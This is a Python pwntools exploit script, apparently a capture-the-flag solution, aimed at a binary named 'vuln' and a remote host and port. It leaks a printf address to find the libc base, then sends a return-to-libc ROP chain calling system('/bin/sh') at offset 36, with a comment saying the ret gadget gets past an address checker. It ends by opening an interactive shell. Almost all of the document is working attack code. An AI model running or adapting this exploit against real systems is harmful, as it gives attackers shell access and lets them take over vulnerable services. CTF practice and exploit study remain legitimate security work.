#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
libc = 'libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '603b874.678470.xyz', 31425

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *vuln+59
break *vuln+65
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    io.recvuntil(b'0x')
    leak = int(io.recvline().strip(), 16)
    libc.address = leak - libc.sym['printf']

    binsh = next(libc.search(b'/bin/sh'))
    ret = rop.ret.address
    system = libc.sym['system']

    # use addr from the binary to bypass addr checker, i use ret
    offset = 36
    payload = flat({
        offset: [
            0x0,
            0x0,
            ret,
            system,
            ret,
            binsh
        ]
    })

    io.sendline(payload)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()